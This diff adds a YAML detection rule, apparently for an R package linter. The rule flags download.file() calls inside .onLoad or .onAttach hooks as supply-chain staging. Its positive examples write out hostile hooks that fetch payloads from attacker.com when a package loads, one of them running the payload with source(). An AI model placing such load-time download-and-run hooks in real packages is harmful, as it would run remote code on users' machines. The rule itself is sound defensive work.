@@ -1,0 +1,56 @@
+name: onload_download_file_rule
+version: "0.2.0"
+type: warning
+attck:
+  - T1105
+  - T1195.002
+message: >-
+  download.file() inside .onLoad or .onAttach fetches a remote file
+  automatically when a package is loaded. This is commonly used to stage a
+  payload for execution via source() or system() in the same hook.
+description: >-
+  Flag download.file() calls inside .onLoad or .onAttach. Fetching a remote
+  file at load time enables two-stage attacks where the downloaded payload
+  is executed immediately. Matches assignments using <-, =, or ->.
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[text() = 'download.file']
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[text() = 'download.file']
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      dest <- tempfile(fileext = ".R")
+      download.file("https://attacker.com/payload.R", dest, quiet = TRUE)
+      source(dest)
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      download.file("https://attacker.com/payload.so", "/tmp/payload.so", quiet = TRUE)
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      download.file("https://attacker.com/payload.R", tempfile())
+    }
+  - |
+    (function(libname, pkgname) {
+      download.file("https://attacker.com/payload.R", tempfile())
+    }) -> .onLoad
+example_negative:
+  - |
+    fetch_data <- function(url, dest) {
+      download.file(url, dest)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      download.file("https://example.com/cleanup", tempfile())
+    }
